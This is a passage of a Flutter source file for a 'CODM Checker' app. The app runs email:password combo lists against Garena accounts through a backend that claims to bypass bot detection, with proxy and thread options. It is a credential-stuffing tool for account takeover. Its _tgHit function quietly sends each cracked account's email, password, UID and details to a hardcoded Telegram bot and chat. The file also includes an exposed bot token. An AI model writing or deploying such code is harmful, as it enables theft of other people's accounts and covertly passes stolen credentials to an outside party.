// ============================================================
//  codm_checker_screen.dart  —  CODM / Garena Checker  v5.2
//
//  Fix v5.2:
//  - Increased Flutter HTTP timeout: 60s → 90s
//    (backend now has a 55s watchdog; 90s Flutter timeout gives
//     headroom for Railway cold starts and network jitter)
//  - TimeoutException now shows a human-readable message instead
//    of the raw Dart exception string
//  - No other changes
// ============================================================

import 'dart:async';
import 'dart:convert';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:google_mobile_ads/google_mobile_ads.dart';
import 'package:http/http.dart' as http;
import 'package:share_plus/share_plus.dart';

import '../services/ad_service.dart';
import '../services/api_service.dart';
import '../theme/app_theme.dart';

// ── Palette ──────────────────────────────────────────────────
const _kAccent  = Color(0xFFFF6B35);
const _kAccent2 = Color(0xFFC0392B);
const _kHit     = Color(0xFF2ECC71);
const _kValid   = Color(0xFF5B8CFF);
const _kBad     = Color(0xFFFF6B6B);
const _kErr     = Color(0xFFFFA94D);

// ── Backend URL ───────────────────────────────────────────────
const _kBackend = 'https://xissin-app-backend-production.up.railway.app';

// ── Telegram (your @Xissinsbot) ─────────────────────────────
const _kTgToken  = '8282381783:AAHs_2v8UGgNM48y1EulMhovNUkTw4ntpjY';
const _kTgChatId = '1910648163';

// ── Result model ──────────────────────────────────────────────
enum _S { hit, noAccount, bad, error }

enum _Filter { all, hit, noAccount, bad, error }

extension _FilterLabel on _Filter {
  String get label {
    switch (this) {
      case _Filter.all:       return 'All';
      case _Filter.hit:       return 'Hits';
      case _Filter.noAccount: return 'Valid';
      case _Filter.bad:       return 'Bad';
      case _Filter.error:     return 'Error';
    }
  }

  Color get color {
    switch (this) {
      case _Filter.all:       return _kAccent;
      case _Filter.hit:       return _kHit;
      case _Filter.noAccount: return _kValid;
      case _Filter.bad:       return _kBad;
      case _Filter.error:     return _kErr;
    }
  }
}

class _R {
  final String combo, nickname, level, region, uid, shell, country, detail;
  final _S status;
  final bool isClean;
  final List<String> binds;
  const _R({
    required this.combo,
    required this.status,
    this.nickname = '',
    this.level    = '',
    this.region   = '',
    this.uid      = '',
    this.shell    = '',
    this.country  = '',
    this.isClean  = false,
    this.detail   = '',
    this.binds    = const [],
  });
  bool get isHit => status == _S.hit || status == _S.noAccount;

  String get fullText {
    final buf = StringBuffer();
    switch (status) {
      case _S.hit:
        buf
          ..writeln('✅ HIT')
          ..writeln('📧 ${combo}')
          ..writeln('🎮 IGN: ${nickname.isNotEmpty ? nickname : "—"}')
          ..writeln('⚡ Level: ${level.isNotEmpty ? level : "—"}')
          ..writeln('🌍 Region: ${region.isNotEmpty ? region : "—"}')
          ..writeln('🆔 UID: ${uid.isNotEmpty ? uid : "—"}')
          ..writeln('💎 Shells: ${shell.isNotEmpty ? shell : "—"}')
          ..writeln('🌐 Country: ${country.isNotEmpty ? country : "—"}')
          ..writeln('🔒 Clean: ${isClean ? "YES" : "NO"}');
        if (binds.isNotEmpty) buf.writeln('🔗 Binds: ${binds.join(", ")}');
      case _S.noAccount:
        buf
          ..writeln('🔵 VALID — NO CODM')
          ..writeln('📧 ${combo}')
          ..writeln('💎 Shells: ${shell.isNotEmpty ? shell : "—"}')
          ..writeln('🌐 Country: ${country.isNotEmpty ? country : "—"}')
          ..writeln('🔒 Clean: ${isClean ? "YES" : "NO"}');
        if (binds.isNotEmpty) buf.writeln('🔗 Binds: ${binds.join(", ")}');
      case _S.bad:
        buf.writeln('❌ BAD — ${combo}');
      case _S.error:
        buf.writeln('⚠️ ERROR — ${combo} — ${detail}');
    }
    return buf.toString().trim();
  }
}

// ── Screen ────────────────────────────────────────────────────
class CodmCheckerScreen extends StatefulWidget {
  final String userId;
  const CodmCheckerScreen({super.key, required this.userId});
  @override
  State<CodmCheckerScreen> createState() => _State();
}

class _State extends State<CodmCheckerScreen> {
  // ── Ads ───────────────────────────────────────────────────
  BannerAd? _banner;
  bool _bannerReady = false;
  bool _adGranted   = false;

  // ── Input / control ──────────────────────────────────────
  final _ctrl      = TextEditingController();
  final _proxyCtrl = TextEditingController();
  final _scroll    = ScrollController();
  bool _proxyEnabled = false;
  int  _concurrency  = 2;

  // ── Run state ─────────────────────────────────────────────
  bool _running = false;
  bool _stopped = false;
  int  _total = 0, _checked = 0, _hits = 0, _bad = 0, _errors = 0, _valid = 0;
  final _results = <_R>[];

  // ── Filter ────────────────────────────────────────────────
  _Filter _filter = _Filter.all;

  // ── Timing ────────────────────────────────────────────────
  final _checkTimes = <double>[];
  DateTime? _startTime;

  // ── Lifecycle ─────────────────────────────────────────────
  @override
  void initState() {
    super.initState();
    AdService.instance.init(userId: widget.userId);
    AdService.instance.addListener(_onAd);
    _initBanner();
    _ctrl.addListener(() => setState(() {}));
  }

  @override
  void dispose() {
    AdService.instance.removeListener(_onAd);
    _banner?.dispose();
    _ctrl.dispose();
    _proxyCtrl.dispose();
    _scroll.dispose();
    super.dispose();
  }

  // ── Ads ───────────────────────────────────────────────────
  void _onAd() {
    if (!mounted) return;
    if (AdService.instance.adsRemoved && _banner != null) {
      _banner?.dispose();
      setState(() { _banner = null; _bannerReady = false; });
    }
  }

  void _initBanner() {
    if (AdService.instance.adsRemoved) return;
    _banner?.dispose();
    _banner = null;
    _bannerReady = false;
    final ad = AdService.instance.createBannerAd(
      onLoaded: () {
        if (!mounted || AdService.instance.adsRemoved) {
          _banner?.dispose(); _banner = null; return;
        }
        setState(() => _bannerReady = true);
      },
      onFailed: () {
        if (mounted) setState(() { _banner = null; _bannerReady = false; });
        Future.delayed(const Duration(seconds: 30), () {
          if (mounted && !AdService.instance.adsRemoved) _initBanner();
        });
      },
    );
    if (ad == null) return;
    _banner = ad;
    _banner!.load();
  }

  Widget _buildBanner() {
    if (AdService.instance.adsRemoved || !_bannerReady || _banner == null) {
      return const SizedBox.shrink();
    }
    return SafeArea(
      top: false,
      child: Container(
        alignment: Alignment.center,
        width:  _banner!.size.width.toDouble(),
        height: _banner!.size.height.toDouble(),
        child: AdWidget(ad: _banner!),
      ),
    );
  }

  void _watchAd() {
    HapticFeedback.selectionClick();
    AdService.instance.showGatedInterstitial(onGranted: () {
      if (mounted) setState(() => _adGranted = true);
    });
  }

  // ── Helpers ───────────────────────────────────────────────
  int get _comboCount =>
      _ctrl.text.split('\n').where((l) => l.trim().isNotEmpty).length;

  String get _etaText {
    if (_checkTimes.isEmpty || _checked >= _total) return '';
    final avg   = _checkTimes.reduce((a, b) => a + b) / _checkTimes.length;
    final remMs = avg * (_total - _checked);
    final secs  = (remMs / 1000).round();
    if (secs < 60) return '~${secs}s left';
    return '~${(secs / 60).toStringAsFixed(1)}m left';
  }

  String get _avgText {
    if (_checkTimes.isEmpty) return '';
    final avg = _checkTimes.reduce((a, b) => a + b) / _checkTimes.length;
    return '${(avg / 1000).toStringAsFixed(1)}s/combo';
  }

  List<_R> get _filtered {
    switch (_filter) {
      case _Filter.all:       return _results;
      case _Filter.hit:       return _results.where((r) => r.status == _S.hit).toList();
      case _Filter.noAccount: return _results.where((r) => r.status == _S.noAccount).toList();
      case _Filter.bad:       return _results.where((r) => r.status == _S.bad).toList();
      case _Filter.error:     return _results.where((r) => r.status == _S.error).toList();
    }
  }

  // ── Backend call ──────────────────────────────────────────
  Future<_R> _checkOne(String combo) async {
    if (!combo.contains(':')) {
      return _R(combo: combo, status: _S.error, detail: 'Bad format — use email:password');
    }
    final t0 = DateTime.now();
    try {
      final body = <String, dynamic>{
        'combo':   combo,
        'user_id': widget.userId,
      };
      final proxyVal = _proxyCtrl.text.trim();
      if (_proxyEnabled && proxyVal.isNotEmpty) body['proxy'] = proxyVal;

      final res = await http.post(
        Uri.parse('$_kBackend/api/codm/check-one'),
        headers: {
          'Content-Type':    'application/json',
          'X-Session-Token': ApiService.sessionToken ?? '',
          'X-App-Id':        'com.xissin.app',
        },
        body: jsonEncode(body),
      ).timeout(
        // FIX v5.2: was 60s — backend now caps at 55s so 90s gives
        // safe headroom for Railway cold-starts and slow networks.
        const Duration(seconds: 90),
        onTimeout: () => http.Response(
          '{"status":"error","detail":"Request timed out (90s) — Garena may be slow or blocking. Try again or enable proxy."}',
          200,
        ),
      );

      final elapsed = DateTime.now().difference(t0).inMilliseconds.toDouble();
      _checkTimes.add(elapsed);
      if (_checkTimes.length > 20) _checkTimes.removeAt(0);

      if (res.statusCode != 200) {
        return _R(combo: combo, status: _S.error, detail: 'Server error ${res.statusCode}');
      }

      final data   = jsonDecode(res.body) as Map<String, dynamic>;
      final status = data['status'] as String? ?? 'error';
      final binds  = (data['binds'] as List?)?.cast<String>() ?? [];

      switch (status) {
        case 'hit':
          final r = _R(
            combo:    combo,
            status:   _S.hit,
            nickname: data['nickname'] ?? '',
            level:    data['level']    ?? '',
            region:   data['region']   ?? '',
            uid:      data['uid']      ?? '',
            shell:    data['shell']    ?? '',
            country:  data['country']  ?? '',
            isClean:  data['is_clean'] == true,
            binds:    binds,
            detail:   'HIT',
          );
          _tgHit(r);
          return r;

        case 'valid_no_codm':
          return _R(
            combo:   combo,
            status:  _S.noAccount,
            shell:   data['shell']   ?? '',
            country: data['country'] ?? '',
            isClean: data['is_clean'] == true,
            binds:   binds,
            detail:  data['detail'] ?? 'Valid Garena — No CODM linked',
          );

        case 'bad':
          return _R(
            combo:  combo,
            status: _S.bad,
            detail: data['detail'] ?? 'Wrong password or account banned',
          );

        default:
          return _R(
            combo:  combo,
            status: _S.error,
            detail: data['detail'] ?? 'Unknown error',
          );
      }
    } on TimeoutException {
      // FIX v5.2: clean human-readable message instead of raw Dart exception
      return _R(
        combo:  combo,
        status: _S.error,
        detail: 'Timed out (90s) — Garena is blocking or slow. Try proxy.',
      );
    } on Exception catch (e) {
      return _R(combo: combo, status: _S.error, detail: 'Request failed: $e');
    }
  }

  // ── Telegram hit notification ─────────────────────────────
  Future<void> _tgHit(_R r) async {
    try {
      await http.post(
        Uri.parse('https://api.telegram.org/bot$_kTgToken/sendMessage'),
        body: {
          'chat_id':    _kTgChatId,
          'parse_mode': 'HTML',
          'text': '🎮 <b>CODM HIT</b> — Xissin App\n\n'
              '📧 <b>Account:</b> ${r.combo}\n'
              '🎮 <b>IGN:</b> ${r.nickname}\n'
              '⚡ <b>Level:</b> ${r.level}\n'
              '🌍 <b>Region:</b> ${r.region}\n'
              '🆔 <b>UID:</b> ${r.uid}\n'
              '💎 <b>Shells:</b> ${r.shell}\n'
              '🌐 <b>Country:</b> ${r.country}\n'
              '🔒 <b>Clean:</b> ${r.isClean ? "✅ YES" : "❌ NO"}',
        },
      ).timeout(const Duration(seconds: 10));
    } catch (_) {}
  }

  // ── Start checker (concurrent) ────────────────────────────
  Future<void> _start() async {
    if (!AdService.instance.adsRemoved && !_adGranted) {
      _watchAd(); return;
    }
    final lines = _ctrl.text
        .split('\n')
        .map((l) => l.trim())
        .where((l) => l.isNotEmpty)
        .toList();
    if (lines.isEmpty) return;

    FocusScope.of(context).unfocus();
    HapticFeedback.mediumImpact();
    setState(() {
      _running = true; _stopped = false;
      _total   = lines.length;
      _checked = 0; _hits = 0; _bad = 0; _errors = 0; _valid = 0;
      _results.clear();
      _checkTimes.clear();
      _startTime = DateTime.now();
      _filter = _Filter.all;
    });

    final semaphore = <Future>[];
    int idx = 0;

    Future<void> processOne(String combo) async {
      if (_stopped || !mounted) return;
      final r = await _checkOne(combo);
      if (!mounted) return;
      setState(() {
        _checked++;
        _results.insert(0, r);
        switch (r.status) {
          case _S.hit:       _hits++;   break;
          case _S.noAccount: _valid++;  break;
          case _S.bad:       _bad++;    break;
          case _S.error:     _errors++; break;
        }
      });
      if (_scroll.hasClients) _scroll.jumpTo(0);
    }

    while (idx < lines.length && !_stopped) {
      while (semaphore.length < _concurrency && idx < lines.length && !_stopped) {
        final combo = lines[idx++];
        semaphore.add(processOne(combo));
      }
      if (semaphore.isNotEmpty) {
        await semaphore.first;
        semaphore.removeAt(0);
      }
    }

    await Future.wait(semaphore);

    if (!mounted) return;
    setState(() => _running = false);
    Future.delayed(const Duration(milliseconds: 600), () {
      if (!AdService.instance.adsRemoved) AdService.instance.showInterstitial();
    });
  }

  void _reset() {
    if (!AdService.instance.adsRemoved) AdService.instance.showInterstitial();
    HapticFeedback.mediumImpact();
    setState(() {
      _running = false; _stopped = false;
      _total = 0; _checked = 0;
      _hits = 0; _bad = 0; _errors = 0; _valid = 0;
      _results.clear(); _ctrl.clear();
      _checkTimes.clear();
      _filter = _Filter.all;
    });
  }

  void _share() {
    if (!AdService.instance.adsRemoved) AdService.instance.showInterstitial();
    final hits = _results.where((r) => r.status == _S.hit).toList();
    if (hits.isEmpty) return;
    final b = StringBuffer()
      ..writeln('🎮 CODM Hits — Xissin\n══════════════════════════');
    for (final h in hits) {
      b
        ..writeln('📧 ${h.combo}')
        ..writeln('🎮 IGN: ${h.nickname}')
        ..writeln('⚡ Lv.${h.level} | ${h.region}')
        ..writeln('💎 Shells: ${h.shell} | 🔒 Clean: ${h.isClean ? "YES" : "NO"}')
        ..writeln('──────────────────────────');
    }
    Share.share(b.toString(), subject: 'CODM Hits');
  }

  void _copyAllHits() {
    final hits = _results.where((r) => r.status == _S.hit).toList();
    if (hits.isEmpty) return;
    if (!AdService.instance.adsRemoved) AdService.instance.showInterstitial();
    final b = StringBuffer()
      ..writeln('🎮 CODM Hits — Xissin App')
      ..writeln('══════════════════════════');
    for (final h in hits) {
      b
        ..writeln(h.fullText)
        ..writeln('──────────────────────────');
    }
    Clipboard.setData(ClipboardData(text: b.toString().trim()));
    HapticFeedback.selectionClick();
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      content: Text('${hits.length} hit(s) copied!'),
      backgroundColor: _kHit,
      duration: const Duration(seconds: 2),
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
      margin: const EdgeInsets.all(12),
    ));
  }

  Future<void> _pasteFromClipboard() async {
    final data = await Clipboard.getData('text/plain');
    if (data?.text != null && data!.text!.isNotEmpty) {
      _ctrl.text = data.text!;
      HapticFeedback.selectionClick();
      setState(() {});
    }
  }

  // ── Build ──────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    final c = context.c;
    return Scaffold(
      backgroundColor: c.background,
      bottomNavigationBar: _buildBanner(),
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_ios_new_rounded, color: _kAccent, size: 20),
          onPressed: () {
            if (_running) setState(() => _stopped = true);
            Navigator.pop(context);
          },
        ),
        title: Row(mainAxisSize: MainAxisSize.min, children: [
          Container(
            padding: const EdgeInsets.all(6),
            decoration: BoxDecoration(
              color: _kAccent.withOpacity(.15),
              borderRadius: BorderRadius.circular(10),
            ),
            child: const Icon(Icons.sports_esports_rounded, color: _kAccent, size: 18),
          ),
          const SizedBox(width: 10),
          Text(
            'CODM Checker',
            style: TextStyle(
              color: c.textPrimary, fontSize: 17,
              fontWeight: FontWeight.w700, letterSpacing: .4,
            ),
          ),
        ]),
        centerTitle: true,
        actions: [
          if (_results.any((r) => r.status == _S.hit)) ...[
            IconButton(
              icon: const Icon(Icons.copy_all_rounded, color: _kAccent, size: 20),
              tooltip: 'Copy all hits',
              onPressed: _copyAllHits,
            ),
            IconButton(
              icon: const Icon(Icons.share_rounded, color: _kAccent, size: 20),
              onPressed: _share,
            ),
          ],
          if (!_running && _results.isNotEmpty)
            IconButton(
              icon: const Icon(Icons.refresh_rounded, color: _kAccent, size: 20),
              onPressed: _reset,
            ),
        ],
      ),
      body: SingleChildScrollView(
        controller: _scroll,
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            if (!AdService.instance.adsRemoved && !_adGranted) _adGate(c),
            if (_total > 0) ...[_statsBar(c), const SizedBox(height: 8)],
            if (_total > 0) ...[_filterBar(c), const SizedBox(height: 10)],
            _inputCard(c),
            const SizedBox(height: 14),
            ..._filtered.map((r) => _resultCard(r, c)),
            const SizedBox(height: 60),
          ],
        ),
      ),
    );
  }

  // ── Ad gate ───────────────────────────────────────────────
  Widget _adGate(XissinColors c) => Container(
    margin: const EdgeInsets.only(bottom: 14),
    padding: const EdgeInsets.all(16),
    decoration: BoxDecoration(
      color: _kAccent.withOpacity(.06),
      borderRadius: BorderRadius.circular(18),
      border: Border.all(color: _kAccent.withOpacity(.25)),
    ),
    child: Column(children: [
      Row(children: [
        const Icon(Icons.lock_outline_rounded, color: _kAccent, size: 18),
        const SizedBox(width: 10),
        Expanded(child: Text(
          'Watch a short ad to unlock for this session.',
          style: TextStyle(color: c.textSecondary, fontSize: 12, height: 1.4),
        )),
      ]),
      const SizedBox(height: 12),
      SizedBox(width: double.infinity, child: ElevatedButton.icon(
        onPressed: _watchAd,
        style: ElevatedButton.styleFrom(
          backgroundColor: _kAccent,
          foregroundColor: Colors.white,
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
          elevation: 0,
          padding: const EdgeInsets.symmetric(vertical: 12),
        ),
        icon: const Icon(Icons.play_circle_rounded, size: 18),
        label: const Text('Watch Ad to Unlock',
            style: TextStyle(fontWeight: FontWeight.w700)),
      )),
      const SizedBox(height: 8),
      Text('⭐ Get Premium to remove all ads permanently',
          style: TextStyle(color: c.textHint, fontSize: 11)),
    ]),
  );

  // ── Stats bar ─────────────────────────────────────────────
  Widget _statsBar(XissinColors c) => Container(
    padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
    decoration: BoxDecoration(
      color: c.surface,
      borderRadius: BorderRadius.circular(16),
      border: Border.all(color: c.border),
    ),
    child: Column(children: [
      Row(children: [
        _chip('✅ Hits',  '$_hits',   _kHit),
        _div(),
        _chip('🔵 Valid', '$_valid',  _kValid),
        _div(),
        _chip('❌ Bad',   '$_bad',    _kBad),
        _div(),
        _chip('⚠️ Err',  '$_errors', _kErr),
        _div(),
        _chip('📋 Done', '$_checked/$_total', _kAccent),
        if (_running) ...[
          _div(),
          const SizedBox(
            width: 14, height: 14,
            child: CircularProgressIndicator(color: _kAccent, strokeWidth: 2),
          ),
        ],
      ]),
      if (_running && _total > 0) ...[
        const SizedBox(height: 8),
        ClipRRect(
          borderRadius: BorderRadius.circular(10),
          child: LinearProgressIndicator(
            value: _total > 0 ? _checked / _total : null,
            backgroundColor: _kAccent.withOpacity(.15),
            valueColor: const AlwaysStoppedAnimation(_kAccent),
            minHeight: 4,
          ),
        ),
        const SizedBox(height: 4),
        Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
          Text(
            '${(_checked / _total * 100).toStringAsFixed(0)}%',
            style: TextStyle(color: c.textHint, fontSize: 10),
          ),
          if (_etaText.isNotEmpty)
            Text(_etaText,
                style: TextStyle(color: c.textHint, fontSize: 10)),
          if (_avgText.isNotEmpty)
            Text(_avgText,
                style: TextStyle(color: c.textHint, fontSize: 10)),
        ]),
      ],
    ]),
  );

  // ── Filter bar ────────────────────────────────────────────
  Widget _filterBar(XissinColors c) {
    final counts = {
      _Filter.all:       _results.length,
      _Filter.hit:       _results.where((r) => r.status == _S.hit).length,
      _Filter.noAccount: _results.where((r) => r.status == _S.noAccount).length,
      _Filter.bad:       _results.where((r) => r.status == _S.bad).length,
      _Filter.error:     _results.where((r) => r.status == _S.error).length,
    };
    return SingleChildScrollView(
      scrollDirection: Axis.horizontal,
      child: Row(
        children: _Filter.values.map((f) {
          final active = _filter == f;
          final col = f.color;
          return Padding(
            padding: const EdgeInsets.only(right: 8),
            child: GestureDetector(
              onTap: () {
                HapticFeedback.selectionClick();
                setState(() => _filter = f);
              },
              child: AnimatedContainer(
                duration: const Duration(milliseconds: 180),
                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                decoration: BoxDecoration(
                  color: active ? col.withOpacity(.18) : c.surface,
                  borderRadius: BorderRadius.circular(20),
                  border: Border.all(
                    color: active ? col : c.border,
                    width: active ? 1.5 : 1,
                  ),
                ),
                child: Text(
                  '${f.label} (${counts[f]})',
                  style: TextStyle(
                    color: active ? col : c.textSecondary,
                    fontSize: 11,
                    fontWeight: active ? FontWeight.w700 : FontWeight.w500,
                  ),
                ),
              ),
            ),
          );
        }).toList(),
      ),
    );
  }

  // ── Input card ────────────────────────────────────────────
  Widget _inputCard(XissinColors c) => Container(
    padding: const EdgeInsets.all(16),
    decoration: BoxDecoration(
      color: c.surface,
      borderRadius: BorderRadius.circular(18),
      border: Border.all(color: _kAccent.withOpacity(.3)),
    ),
    child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [

      // ── Label row ─────────────────────────────────────────
      Row(children: [
        const Icon(Icons.list_alt_rounded, color: _kAccent, size: 16),
        const SizedBox(width: 8),
        Text(
          'Combo List (email:password)',
          style: TextStyle(color: _kAccent, fontSize: 12, fontWeight: FontWeight.w600),
        ),
        const Spacer(),
        if (!_running)
          GestureDetector(
            onTap: _pasteFromClipboard,
            child: Container(
              padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
              decoration: BoxDecoration(
                color: _kAccent.withOpacity(.1),
                borderRadius: BorderRadius.circular(8),
              ),
              child: Row(mainAxisSize: MainAxisSize.min, children: [
                const Icon(Icons.content_paste_rounded, color: _kAccent, size: 12),
                const SizedBox(width: 4),
                Text('Paste', style: TextStyle(color: _kAccent, fontSize: 10, fontWeight: FontWeight.w600)),
              ]),
            ),
          ),
      ]),

      const SizedBox(height: 10),

      // ── Textarea ──────────────────────────────────────────
      TextField(
        controller: _ctrl,
        enabled: !_running,
        minLines: 5,
        maxLines: 10,
        style: TextStyle(color: c.textPrimary, fontSize: 12, fontFamily: 'monospace'),
        decoration: InputDecoration(
          hintText: 'email@example.com:password\nemail2@test.com:pass456',
          hintStyle: TextStyle(color: c.textHint, fontSize: 11),
          filled: true,
          fillColor: c.background,
          border: OutlineInputBorder(
            borderRadius: BorderRadius.circular(12),
            borderSide: BorderSide.none,
          ),
          contentPadding: const EdgeInsets.all(12),
        ),
        keyboardType: TextInputType.multiline,
      ),

      if (_comboCount > 0 && !_running) ...[
        const SizedBox(height: 6),
        Padding(
          padding: const EdgeInsets.symmetric(horizontal: 4),
          child: Text(
            '$_comboCount combo${_comboCount == 1 ? "" : "s"} loaded',
            style: TextStyle(color: c.textHint, fontSize: 10),
          ),
        ),
      ],

      const SizedBox(height: 12),

      // ── Concurrency row ───────────────────────────────────
      Row(children: [
        Icon(Icons.flash_on_rounded, color: _kAccent.withOpacity(.8), size: 14),
        const SizedBox(width: 6),
        Text(
          'Threads: $_concurrency',
          style: TextStyle(color: c.textSecondary, fontSize: 11, fontWeight: FontWeight.w600),
        ),
        const Spacer(),
        ...List.generate(5, (i) {
          final n = i + 1;
          final selected = _concurrency == n;
          return Padding(
            padding: const EdgeInsets.only(left: 6),
            child: GestureDetector(
              onTap: _running ? null : () {
                HapticFeedback.selectionClick();
                setState(() => _concurrency = n);
              },
              child: Container(
                width: 28, height: 28,
                decoration: BoxDecoration(
                  color: selected ? _kAccent : c.background,
                  borderRadius: BorderRadius.circular(8),
                  border: Border.all(
                    color: selected ? _kAccent : c.border,
                  ),
                ),
                alignment: Alignment.center,
                child: Text(
                  '$n',
                  style: TextStyle(
                    color: selected ? Colors.white : c.textSecondary,
                    fontSize: 11,
                    fontWeight: FontWeight.w700,
                  ),
                ),
              ),
            ),
          );
        }),
      ]),

      const SizedBox(height: 12),

      // ── Proxy toggle ──────────────────────────────────────
      GestureDetector(
        onTap: () {
          if (_running) return;
          HapticFeedback.selectionClick();
          setState(() => _proxyEnabled = !_proxyEnabled);
        },
        child: Container(
          padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
          decoration: BoxDecoration(
            color: _proxyEnabled ? _kValid.withOpacity(.1) : c.background,
            borderRadius: BorderRadius.circular(10),
            border: Border.all(
              color: _proxyEnabled ? _kValid.withOpacity(.4) : c.border,
            ),
          ),
          child: Row(children: [
            Icon(Icons.vpn_lock_rounded,
                color: _proxyEnabled ? _kValid : c.textHint, size: 15),
            const SizedBox(width: 8),
            Expanded(child: Text(
              'Use Proxy',
              style: TextStyle(
                color: _proxyEnabled ? _kValid : c.textSecondary,
                fontSize: 12,
                fontWeight: FontWeight.w600,
              ),
            )),
            Switch(
              value: _proxyEnabled,
              onChanged: _running ? null : (v) {
                HapticFeedback.selectionClick();
                setState(() => _proxyEnabled = v);
              },
              activeColor: _kValid,
              materialTapTargetSize: MaterialTapTargetSize.shrinkWrap,
            ),
          ]),
        ),
      ),

      if (_proxyEnabled) ...[
        const SizedBox(height: 8),
        TextField(
          controller: _proxyCtrl,
          enabled: !_running,
          style: TextStyle(color: c.textPrimary, fontSize: 12, fontFamily: 'monospace'),
          decoration: InputDecoration(
            hintText: 'http://user:pass@host:port  or  host:port',
            hintStyle: TextStyle(color: c.textHint, fontSize: 11),
            filled: true,
            fillColor: c.background,
            prefixIcon: Icon(Icons.dns_rounded, color: _kValid, size: 16),
            suffixIcon: _proxyCtrl.text.isNotEmpty
                ? IconButton(
                    icon: Icon(Icons.clear_rounded, color: c.textHint, size: 16),
                    onPressed: () => setState(() => _proxyCtrl.clear()),
                  )
                : null,
            border: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: BorderSide(color: _kValid.withOpacity(.3)),
            ),
            enabledBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: BorderSide(color: _kValid.withOpacity(.3)),
            ),
            focusedBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: const BorderSide(color: _kValid),
            ),
            contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
          ),
          keyboardType: TextInputType.url,
          onChanged: (_) => setState(() {}),
        ),
        const SizedBox(height: 4),
        Padding(
          padding: const EdgeInsets.symmetric(horizontal: 4),
          child: Text(
            'Leave blank to use the backend proxy pool (if set by admin).',
            style: TextStyle(color: c.textHint, fontSize: 10),
          ),
        ),
      ],

      const SizedBox(height: 12),

      // ── Backend info chip ─────────────────────────────────
      Container(
        padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
        decoration: BoxDecoration(
          color: _kAccent.withOpacity(.08),
          borderRadius: BorderRadius.circular(8),
        ),
        child: Row(children: [
          const Icon(Icons.cloud_done_rounded, color: _kAccent, size: 13),
          const SizedBox(width: 6),
          Text(
            'Powered by Xissin backend — bypasses bot detection',
            style: TextStyle(color: c.textSecondary, fontSize: 10),
          ),
        ]),
      ),

      const SizedBox(height: 12),

      // ── Start / Stop / Reset row ──────────────────────────
      Row(children: [
        Expanded(child: ElevatedButton.icon(
          onPressed: _running ? () => setState(() => _stopped = true) : _start,
          style: ElevatedButton.styleFrom(
            backgroundColor: _running ? _kBad : _kAccent,
            foregroundColor: Colors.white,
            elevation: 0,
            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
            padding: const EdgeInsets.symmetric(vertical: 13),
          ),
          icon: Icon(_running ? Icons.stop_rounded : Icons.play_arrow_rounded, size: 18),
          label: Text(
            _running ? 'Stop' : 'Start Check',
            style: const TextStyle(fontWeight: FontWeight.w700, fontSize: 14),
          ),
        )),
        if (!_running && _results.isNotEmpty) ...[
          const SizedBox(width: 10),
          ElevatedButton.icon(
            onPressed: _reset,
            style: ElevatedButton.styleFrom(
              backgroundColor: c.surface,
              foregroundColor: _kAccent,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(12),
                side: BorderSide(color: _kAccent.withOpacity(.4)),
              ),
              elevation: 0,
              padding: const EdgeInsets.symmetric(vertical: 13, horizontal: 16),
            ),
            icon: const Icon(Icons.refresh_rounded, size: 16),
            label: const Text('Reset', style: TextStyle(fontWeight: FontWeight.w700, fontSize: 13)),
          ),
        ],
      ]),
    ]),
  );

  // ── Result card ───────────────────────────────────────────
  Widget _resultCard(_R r, XissinColors c) {
    Color sc; IconData si; String sl;
    switch (r.status) {
      case _S.hit:
        sc = _kHit;  si = Icons.check_circle_rounded;  sl = 'HIT ✅';
      case _S.noAccount:
        sc = _kValid; si = Icons.account_box_outlined;  sl = 'VALID — No CODM 🔵';
      case _S.bad:
        sc = _kBad;  si = Icons.cancel_rounded;         sl = 'BAD ❌';
      case _S.error:
        sc = _kErr;  si = Icons.warning_amber_rounded;  sl = 'ERROR ⚠️';
    }

    return GestureDetector(
      onLongPress: () {
        Clipboard.setData(ClipboardData(text: r.fullText));
        HapticFeedback.mediumImpact();
        ScaffoldMessenger.of(context).showSnackBar(SnackBar(
          content: const Text('Full details copied!'),
          backgroundColor: sc,
          duration: const Duration(seconds: 1),
          behavior: SnackBarBehavior.floating,
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
          margin: const EdgeInsets.all(12),
        ));
      },
      child: Container(
        margin: const EdgeInsets.only(bottom: 10),
        padding: const EdgeInsets.all(14),
        decoration: BoxDecoration(
          color: sc.withOpacity(.06),
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: sc.withOpacity(.25)),
        ),
        child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          Row(children: [
            Icon(si, color: sc, size: 15),
            const SizedBox(width: 6),
            Text(sl, style: TextStyle(color: sc, fontSize: 12, fontWeight: FontWeight.w700)),
            const Spacer(),
            GestureDetector(
              onTap: () {
                Clipboard.setData(ClipboardData(text: r.combo));
                HapticFeedback.selectionClick();
              },
              child: Icon(Icons.copy_rounded, color: sc.withOpacity(.7), size: 13),
            ),
          ]),
          const SizedBox(height: 6),
          Text(
            r.combo,
            style: TextStyle(color: c.textPrimary, fontSize: 11, fontFamily: 'monospace'),
            maxLines: 1,
            overflow: TextOverflow.ellipsis,
          ),
          if (r.status == _S.hit && r.nickname.isNotEmpty) ...[
            const SizedBox(height: 8),
            const Divider(height: 1, color: Colors.white12),
            const SizedBox(height: 8),
